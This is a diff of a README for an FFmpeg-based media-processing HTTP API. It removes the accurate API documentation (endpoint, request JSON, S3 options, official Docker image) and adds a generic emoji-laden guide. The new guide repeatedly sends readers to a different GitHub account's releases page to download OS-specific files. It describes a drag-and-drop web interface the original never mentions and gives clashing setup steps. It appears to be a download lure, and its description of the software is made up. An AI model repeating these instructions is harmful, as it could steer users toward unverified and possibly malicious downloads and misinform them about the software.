@@ -1,178 +1,96 @@
-# Media Processing HTTP API (FFmpeg API)
+# 🎥 FFmpeg-API - Simple Media Processing Made Easy
 
-A **HTTP API** for processing video, audio, and images using **FFmpeg**.
+[![Download FFmpeg-API](https://img.shields.io/badge/Download%20FFmpeg--API-blue.svg)](https://github.com/diegoinacio669/FFmpeg-API/releases)
 
-## What it does
+## 📦 Introduction
 
-* Convert media formats (video ↔ audio, MP4 → GIF, WAV → MP3)
-* Resize, trim, or transcode files
-* Extract audio or frames from video
-* Run media workflows without local file handling
+FFmpeg-API is a user-friendly tool designed for video, audio, and image processing. It simplifies media handling with the power of FFmpeg in a Docker-ready format. Users can easily upload files, define how they want their media processed, and receive results via S3, Base64, or HTTP.
 
-You provide input files and FFmpeg commands; the API returns the results via **S3**, **Base64**, or a **direct HTTP stream**.
+## 🚀 Getting Started
 
-## Endpoint
+This guide will help you download and run the FFmpeg-API application. Follow the steps below:
 
-`POST /v1/process`
+### ⚙️ System Requirements
 
-### API Example
+- Operating System: Windows, macOS, or Linux
+- Docker: Ensure you have Docker installed on your system. If you do not have it, you can download it from the [Docker website](https://www.docker.com/get-started).
+- Network Connection: Required for downloading Docker images and processing files.
 
-```bash
-curl -X POST http://localhost:8080/v1/process \
-  -H "Content-Type: application/json" \
-  -d '{
-    "input": {
-      "input.mp4": { "http": "https://example.com/video.mp4" }
-    },
-    "commands": [
-      ["-i", "input.mp4", "-vn", "output.mp3"]
-    ],
-    "output": { "base64": true }
-  }'
-```
+### 📥 Download & Install
 
-## Request Structure
+To get started, you will need to download FFmpeg-API. 
 
-```json
-{
-  "s3Config": { ... },
-  "input": { ... },
-  "commands": [ ... ],
-  "output": { ... }
-}
-```
+**1. Visit the Releases Page:**  
+Click the link below to access the release files.
 
-## Inputs
+[Download FFmpeg-API](https://github.com/diegoinacio669/FFmpeg-API/releases)
 
-A map of **filename → source** (used by FFmpeg).
+**2. Choose the Latest Release:**  
+On the Releases page, find the most recent version of FFmpeg-API. Look for release notes that might indicate new features or fixes.
 
-Supported sources:
+**3. Download the Files:**  
+Download the appropriate files based on your operating system. Look for options labeled with your OS.
 
-* `s3`: Objects stored in S3, referenced as `s3://bucket/key`
-* `http`: Accessible URLs
-* `base64`: Content provided as a Base64-encoded string
-* `temporary`: A placeholder for indeterminate files that are not emitted as outputs
+## 🛠️ Setup Instructions
 
-```json
-{
-  "input.mp4": {
-    "http": "https://example.com/video.mp4"
-  }
-}
-```
+Once you have downloaded the files, follow these instructions to set up the FFmpeg-API.
 
-## FFmpeg Commands
+### 1. Extract Files
 
-An array of FFmpeg argument lists, executed sequentially.
+If the downloaded file is a compressed archive (like .zip or .tar.gz), extract it to a folder on your computer.
 
-```json
-[
-  ["-i", "input.mp4", "-vn", "output.mp3"]
-]
-```
+### 2. Open a Command Line Interface
 
-Filenames reference input files or outputs from previous commands.
+- Windows: Search for 'Command Prompt' or 'PowerShell' in the Start menu.
+- macOS: Open 'Terminal' from the Applications folder.
+- Linux: Open 'Terminal' from your desktop environment.
 
-## Output Options
+### 3. Run Docker
 
-### Upload to S3
+Ensure Docker is running. You might see a whale icon in your system tray if Docker is active. 
 
-```json
-{ "s3": "s3://my-bucket/outputs/" }
-```
+### 4. Navigate to Your Downloaded Directory
 
-### Return Base64
-
-```json
-{ "base64": true }
-```
-
-### Stream via HTTP
-
-```json
-{ "inlineContentType": "audio/mpeg" }
-```
-
-> When streaming, the first output file is returned directly and no JSON is sent.
-
-## JSON Response
-
-```json
-{
-  "results": {
-    "output.mp3": {
-      "url": "...",
-      "base64": "..."
-    }
-  }
-}
-```
-
-## S3 Configuration
-
-S3 access is configured **per request** using the `s3Config` object.
-
-* Works with:
-  * AWS S3
-  * S3-compatible providers (MinIO, DigitalOcean Spaces, Cloudflare R2, etc.)
-* The `endpoint` should **not** include a bucket name
-
-* `useSSL` defaults to **true** if omitted
-
-### Example
-
-```json
-{
-  "s3Config": {
-    "endpoint": "s3.amazonaws.com",
-    "region": "us-east-1",
-    "accessKey": "AKIA...",
-    "secretKey": "SECRET...",
-    "useSSL": true
-  }
-}
-```
-
-## Docker
-
-* FFmpeg is bundled
-* No external dependencies
-
-### Image
-
-```
-ghcr.io/aureum-cloud/ffmpeg-api:latest
-```
-
-### Run
+Use the command line to change to the directory where you extracted the FFmpeg-API files. For example:
 
 ```bash
-docker run -d -p 8080:8080 ghcr.io/aureum-cloud/ffmpeg-api:latest
+cd path/to/your/FFmpeg-API-folder
 ```
 
-API available at:
+### 5. Run the Application
 
-```
-http://localhost:8080
-```
-
-## Scaling & Concurrency
-
-Each request is handled independently by the HTTP server.
-
-* Input files are fetched **in parallel** (HTTP, S3, Base64 decoding).
-* FFmpeg is executed as a separate OS process per request.
-
-Concurrency comes from handling multiple HTTP requests simultaneously. FFmpeg’s own multithreading is fully supported and can be controlled via standard flags such as:
+Use the following command to start the FFmpeg-API Docker container:
 
 ```bash
--threads 0   # auto
--threads 4   # fixed
+docker run -p 8080:8080 ffmpeg-api
 ```
 
-The service is stateless:
+This command will make the API available at `http://localhost:8080`.
 
-* No shared filesystem state
-* No in-memory session data
+## 🔍 Using FFmpeg-API
 
-This makes it easy to scale **horizontally** by running multiple instances behind a load balancer, for example using **Kubernetes**, or a managed container service.
+After starting the application, you can interact with it via a web interface or API. You will be able to upload media files and select how you want them processed. 
+
+### Available Features
+
+- **Upload Files:** Drag and drop your media files directly onto the interface.
+- **Define Processing Steps:** Choose filters and effect options like resizing, format changes, or audio adjustments.
+- **Receive Results:** Get your processed media back through S3, Base64, or HTTP streaming.
+
+## 🌐 Additional Resources
+
+For further information, check out the documentation in the repository. It includes details about different media formats, API usage examples, and troubleshooting tips.
+
+## 🎁 Support and Feedback
+
+If you encounter any issues or have questions, please check the repository’s Issues section on GitHub. You can create a new issue or join discussions.
+
+## 📣 Contributing
+
+We welcome contributions! If you would like to help improve FFmpeg-API, please refer to the contributing guidelines in the repository.
+
+---
+
+By following these steps, you will be able to download, set up, and use the FFmpeg-API confidently. Happy media processing! 
+
+[Download FFmpeg-API](https://github.com/diegoinacio669/FFmpeg-API/releases)
